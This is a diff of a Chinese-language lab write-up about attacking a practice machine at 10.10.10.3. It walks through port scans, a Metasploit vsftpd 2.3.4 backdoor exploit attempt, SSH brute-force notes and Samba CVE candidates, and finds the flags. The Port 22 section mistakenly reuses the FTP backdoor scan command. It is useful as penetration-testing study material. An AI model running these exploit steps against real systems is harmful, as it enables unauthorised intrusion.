@@ -33,7 +33,7 @@ nmap -A -p- -oA nmap/tcp 10.10.10.3
 **如果想先快速扫开放端口，再扫服务，差别不大，[对比看这里](../../../oscp/Nmap-Tips/#0x02-扫描速度)。**
 
 康康扫到了啥。
-- **21**: ftp 2.3.4，且允许匿名登录
+- **21**: vsftpd 2.3.4，且允许匿名登录
 - **22**: openssh 4.7，允许 root 密码登录，可爆破
 - **139**: samba 3.x ~ 4.x，可能是漏洞版本
 - **445**: samba 3.0.20-Debian，可能是漏洞版本
@@ -49,13 +49,49 @@ nmap -sU -p- -oA nmap/udp 10.10.10.3
 ```
 没有扫到，无 UDP 端口开放。
 
-## 0x02 找 exp
+## 0x02 根据端口逐一突破
 
 ### 1、Port 21
+google 一下发现 `vsftpd v2.3.4` 有公开 RCE，是开发哥写的后门，康康 `nmap` 有无脚本，路径在 `/usr/share/nmap/scripts/*`。
+``` java
+ll /usr/share/nmap/scripts/ftp*
+```
+![](./13.png)
+`nmap` 扫一下，没有详细漏洞回显，说明这里无法利用。
+``` java
+nmap --script ftp-vsftpd-backdoor -p 21 10.10.10.3
+```
+![](./5.png)
+不甘心，上 MSF 找下 exp 试试，然后也打不下来，可能**已经打了补丁？还是姿势不对？总之这里搞不来**，下一位。。。
+``` java
+search samba
+use exploit/unix/ftp/vsftpd_234_backdoor
+show options
+set rhosts 10.10.10.3
+exploit
+```
+![](./6.png)
 
 ### 2、Port 22
+google 一下没有找到有用的漏洞，dos 啥的没用。找下 `nmap` 相关脚本。
+``` java
+ll /usr/share/nmap/scripts/ssh*
+```
+脚本扫出允许公钥和密码登录，可以爆破。但是**爆破这玩意不靠谱，先放一下**后面再说。
+``` java
+nmap --script ftp-vsftpd-backdoor -p 21 10.10.10.3
+```
+![](./4.png)
 
 ### 3、Port 139、445
+google 一下当前版本，找到几个可能用得上。
+- 3.x ~ 4.x: smb-vuln-cve-2017-7494
+- 3.x: smbclient 后门
+- 3.2.20: username_map_script RCE
+`nmap` 扫下。。
+。（明天再写）
+。
+
 MSF 开起来，搜关键字。
 ``` java
 search samba
@@ -97,6 +133,9 @@ hostname
 id
 ```
 ![](./11.png)
-翻找文件，在 `/root/root.txt`、`/home/makis/user.txt` 找到 flag。
+翻文件，flag 一般在用户个人目录下，最后在 `/root/root.txt`、`/home/makis/user.txt` 找到 flag。
 
 ![](./12.png)
+
+### 4、Port 3626
+虽然在上个端口已经拿下了，还是要看看最后一个端口有无搞头。
